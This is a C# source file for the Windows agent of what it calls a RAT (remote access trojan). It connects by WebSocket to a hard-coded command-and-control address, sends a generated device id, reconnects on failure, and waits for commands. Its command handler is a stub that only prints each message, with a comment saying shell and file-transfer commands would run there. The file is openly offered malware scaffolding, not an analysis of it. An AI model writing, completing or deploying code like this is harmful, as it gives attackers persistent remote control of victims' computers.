using System;
using System.Net.WebSockets;
using System.Threading;
using System.Threading.Tasks;
using System.Text;
using Newtonsoft.Json;

namespace Rat.Agent.Windows
{
    public class AgentService
    {
        private ClientWebSocket _client;
        private readonly string _c2Url = "wss://api.androidrat.online/ws";
        private readonly string _deviceId;

        public AgentService()
        {
            _deviceId = Guid.NewGuid().ToString();
            _client = new ClientWebSocket();
        }

        public async Task StartAsync(CancellationToken ct)
        {
            Console.WriteLine($"[*] Starting Agent {_deviceId}");
            
            while (!ct.IsCancellationRequested)
            {
                try
                {
                    if (_client.State != WebSocketState.Open)
                    {
                        await ConnectAsync(ct);
                    }
                    
                    await ReceiveLoopAsync(ct);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error: {ex.Message}. Retrying in 10s...");
                    await Task.Delay(10000, ct);
                    _client = new ClientWebSocket(); // Reset client
                }
            }
        }

        private async Task ConnectAsync(CancellationToken ct)
        {
            var uri = new Uri($"{_c2Url}?id={_deviceId}&platform=windows");
            await _client.ConnectAsync(uri, ct);
            Console.WriteLine("[+] Connected to C2 server");
        }

        private async Task ReceiveLoopAsync(CancellationToken ct)
        {
            var buffer = new byte[1024 * 4];
            while (_client.State == WebSocketState.Open)
            {
                var result = await _client.ReceiveAsync(new ArraySegment<byte>(buffer), ct);
                if (result.MessageType == WebSocketMessageType.Close) break;

                var message = Encoding.UTF8.GetString(buffer, 0, result.Count);
                HandleCommand(message);
            }
        }

        private void HandleCommand(string json)
        {
            // Logic to parse and execute commands (e.g., shell, file transfer)
            Console.WriteLine($"[*] Received command: {json}");
        }
    }
}
